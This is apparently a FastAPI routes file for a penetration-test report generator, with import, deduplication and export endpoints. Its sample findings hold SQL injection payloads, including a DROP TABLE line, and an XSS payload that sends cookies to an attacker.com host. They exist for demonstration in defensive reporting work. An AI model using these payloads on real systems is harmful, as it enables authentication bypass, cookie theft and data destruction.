"""
API Routes — all endpoints for the VAPT Report Automation System.
"""
from __future__ import annotations

import json
import logging
from typing import List, Optional

from fastapi import APIRouter, File, HTTPException, Query, UploadFile, Response
from fastapi.responses import HTMLResponse, JSONResponse
import io
from docx import Document
from htmldocx import HtmlToDocx

from models.schemas import (
    Finding, FindingStats, ImportResult,
    ParseOptions, ReportPayload, ValidationResult,
)
from parsers.csv_parser import parse_csv
from services.report_generator import compute_stats, render_report
from services.validation import validate_findings

log = logging.getLogger(__name__)

# Public routes (no auth required)
public_router = APIRouter()

# Protected routes (auth enforced in main.py via dependencies=[Depends(require_user)])
router = APIRouter()


# ─── Health ───────────────────────────────────────────────────────────────────

@public_router.get("/health")
async def health():
    return {"status": "ok", "service": "VAPT Report API", "version": "2.0.0"}


# ─── Import Endpoints ──────────────────────────────────────────────────────────

@router.post("/import/csv", response_model=ImportResult)
async def import_csv(
    file: UploadFile = File(...),
    severity_threshold: Optional[str] = Query(default="info"),
):
    """
    Upload a Nessus/OpenVAS/Generic CSV file.
    Auto-detects scanner type. Returns normalized findings array.
    """
    if not file.filename or not file.filename.lower().endswith(".csv"):
        raise HTTPException(status_code=400, detail="Only .csv files are accepted")

    content = await file.read()
    if not content:
        raise HTTPException(status_code=400, detail="Uploaded file is empty")

    result = parse_csv(content, filename=file.filename or "")
    log.info("CSV import: %d findings from %s", result.count, file.filename)
    return result





# ─── Findings Endpoints ────────────────────────────────────────────────────────

@router.post("/findings/validate", response_model=ValidationResult)
async def validate(findings: List[Finding]):
    """Validate a list of findings against required schema rules."""
    return validate_findings(findings)


@router.post("/findings/stats", response_model=FindingStats)
async def get_stats(findings: List[Finding]):
    """Compute severity statistics for a findings list."""
    return compute_stats(findings)


@router.post("/findings/deduplicate", response_model=List[Finding])
async def deduplicate(findings: List[Finding]):
    """
    Remove duplicate findings (same title + description + recommendation + affected components).
    Returns deduplicated list sorted by severity.
    """
    seen: set = set()
    unique: List[Finding] = []
    for f in findings:
        components = tuple(sorted(f.affected_components)) if f.affected_components else ()
        key = (
            f.title.strip().lower() if f.title else "",
            f.description.strip().lower() if f.description else "",
            f.recommendation.strip().lower() if f.recommendation else "",
            components
        )
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique


# ─── Export Endpoints ──────────────────────────────────────────────────────────

@router.post("/export/json")
async def export_json(payload: ReportPayload):
    """
    Return template-compatible JSON matching the SysReptor schema.
    Excludes false positives from findings array.
    """
    stats = compute_stats(payload.findings)
    active = [f for f in payload.findings if not f.false_positive]

    output = {
        "report": payload.report.model_dump(),
        "findings": [f.model_dump() for f in active],
        "finding_stats": stats.model_dump(),
    }
    return JSONResponse(content=output)


@router.post("/export/html", response_class=HTMLResponse)
async def export_html(
    payload: ReportPayload,
    template: Optional[str] = Query(default="default_report"),
):
    """
    Render a full HTML pentest report using the specified template.
    Use template=modern_report for the dark cyberpunk variant.
    """
    html = render_report(
        meta=payload.report,
        findings=payload.findings,
        template_name=template or "default_report",
    )
    return HTMLResponse(content=html)


@router.post("/export/preview", response_class=HTMLResponse)
async def preview_html(payload: ReportPayload):
    """Quick preview using default template (no query param needed)."""
    html = render_report(meta=payload.report, findings=payload.findings)
    return HTMLResponse(content=html)


@router.post("/export/docx")
async def export_docx(
    payload: ReportPayload,
    template: Optional[str] = Query(default="default_report"),
):
    """
    Export as a proper MS Word .docx file.
    """
    html = render_report(
        meta=payload.report,
        findings=payload.findings,
        template_name=template or "default_report",
    )
    
    try:
        document = Document()
        new_parser = HtmlToDocx()
        new_parser.add_html_to_document(html, document)
        
        file_stream = io.BytesIO()
        document.save(file_stream)
        file_stream.seek(0)
        
        return Response(
            content=file_stream.read(),
            media_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            headers={"Content-Disposition": "attachment; filename=vapt_report.docx"}
        )
    except Exception as e:
        log.error("DOCX generation error: %s", str(e))
        raise HTTPException(status_code=500, detail=f"Failed to generate DOCX: {e}")


# ─── Sample Data ──────────────────────────────────────────────────────────────

@router.get("/sample/findings")
async def sample_findings():
    """Return sample findings for testing and UI demonstration."""
    return {
        "findings": [
            {
                "id": "s001",
                "title": "SQL Injection — Login Form",
                "summary": "Authentication bypass via unsanitized username parameter",
                "description": "The `/api/auth/login` endpoint concatenates user-supplied input directly into the SQL query without parameterization.\n\n```\nSELECT * FROM users WHERE username='{input}' AND password='{input}'\n```\n\nThis allows an attacker to inject SQL syntax and bypass authentication entirely.",
                "impact": "Complete database compromise, authentication bypass without valid credentials, and potential Remote Code Execution via database-specific features (e.g., `xp_cmdshell`, `INTO OUTFILE`).",
                "recommendation": "Use parameterized queries or prepared statements for **all** database interactions. Never concatenate user input into SQL strings. Example fix:\n\n```python\ncursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password))\n```",
                "cvss": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "level": "critical"},
                "ease": "Trivial",
                "cwe": "CWE-89",
                "affected_components": ["/api/auth/login", "/api/admin/login"],
                "payload": ["' OR 1=1--", "admin'--", "1' UNION SELECT NULL,NULL,NULL--", "'; DROP TABLE users;--"],
                "poc": "```\nPOST /api/auth/login HTTP/1.1\nContent-Type: application/json\n\n{\"username\": \"' OR 1=1--\", \"password\": \"test\"}\n\nHTTP/1.1 200 OK\n{\"token\": \"eyJhbGciOiJIUzI1NiJ9...\", \"user\": \"admin\"}\n```",
                "references": ["https://owasp.org/www-community/attacks/SQL_Injection", "https://cwe.mitre.org/data/definitions/89.html"],
                "validated": True, "false_positive": False, "source": "manual"
            },
            {
                "id": "s002",
                "title": "Stored XSS — User Profile Display Name",
                "summary": "Stored script executes on profile view for all users",
                "description": "The user profile display name field accepts HTML without server-side sanitization. The input is persisted to the database and rendered directly in the DOM when other users view the profile. This results in stored (persistent) XSS execution.",
                "impact": "Session hijacking of all users who view the affected profile, credential theft via keyloggers, stored malware distribution, and account takeover at scale.",
                "recommendation": "Sanitize all user input before storage using a server-side HTML sanitizer (e.g., DOMPurify, bleach). Apply context-aware output encoding on display. Implement a strict `Content-Security-Policy` header.",
                "cvss": {"score": 8.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N", "level": "high"},
                "ease": "Trivial",
                "cwe": "CWE-79",
                "affected_components": ["/api/profile/update", "/profile/{username}"],
                "payload": ["<script>fetch('https://attacker.com?c='+document.cookie)</script>", "<img src=x onerror=alert(document.domain)>", "<svg onload=eval(atob('...'))>"],
                "poc": "1. Login as attacker, navigate to /profile/settings\n2. Set display name to `<script>alert(document.cookie)</script>`\n3. Save profile\n4. Login as victim user, navigate to attacker's profile\n5. Script executes in victim's browser context",
                "references": ["https://portswigger.net/web-security/cross-site-scripting/stored"],
                "validated": True, "false_positive": False, "source": "manual"
            },
            {
                "id": "s003",
                "title": "IDOR — Unauthorized User Data Access",
                "summary": "Missing ownership validation on user profile API",
                "description": "The `/api/users/{id}/profile` endpoint returns sensitive user data without verifying that the authenticated user owns or has permission to access the requested resource. An authenticated attacker can enumerate all user IDs and exfiltrate the entire user database.",
                "impact": "Full PII exposure including names, email addresses, phone numbers, and addresses for all registered users. Regulatory violations (GDPR, PDPA).",
                "recommendation": "Implement server-side ownership validation: verify `request.user.id == requested_id` before returning data. Use UUID-based IDs to reduce guessability. Apply principle of least privilege to all API endpoints.",
                "cvss": {"score": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", "level": "high"},
                "ease": "Moderate",
                "cwe": "CWE-639",
                "affected_components": ["/api/users/{id}/profile", "/api/orders/{id}"],
                "payload": ["GET /api/users/1001/profile", "GET /api/users/1002/profile"],
                "poc": "```\n# Authenticated as user_id=2000:\nGET /api/users/1001/profile\nAuthorization: Bearer <valid_token>\n\nHTTP/1.1 200 OK\n{\"name\": \"Victim User\", \"email\": \"victim@corp.com\", \"phone\": \"+91-XXXXXXXXXX\"}\n```",
                "references": ["https://portswigger.net/web-security/access-control/idor", "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"],
                "validated": False, "false_positive": False, "source": "manual"
            },
            {
                "id": "s004",
                "title": "Missing Security Headers",
                "summary": "HTTP response headers do not include recommended security controls",
                "description": "The application's HTTP responses are missing several industry-standard security headers that protect against common client-side attacks.",
                "impact": "Increased attack surface for XSS, clickjacking, MIME-type sniffing, and information disclosure attacks.",
                "recommendation": "Configure the web server or application to emit the following headers on all responses:\n\n- `Content-Security-Policy: default-src 'self'`\n- `X-Frame-Options: DENY`\n- `X-Content-Type-Options: nosniff`\n- `Referrer-Policy: strict-origin-when-cross-origin`\n- `Permissions-Policy: geolocation=(), microphone=()`",
                "cvss": {"score": 4.3, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", "level": "medium"},
                "ease": "Trivial",
                "cwe": "CWE-693",
                "affected_components": ["All application responses"],
                "payload": [],
                "poc": "```\ncurl -I https://target.com\n# Response shows no CSP, X-Frame-Options, or X-Content-Type-Options headers\n```",
                "references": ["https://owasp.org/www-project-secure-headers/", "https://securityheaders.com"],
                "validated": True, "false_positive": False, "source": "manual"
            },
        ]
    }


@router.get("/templates")
async def list_templates():
    """List available report templates."""
    from config.settings import settings
    templates = [str(p.relative_to(settings.TEMPLATES_DIR)).replace("\\", "/")[:-5] for p in settings.TEMPLATES_DIR.glob("**/*.html")]
    return {"templates": templates}
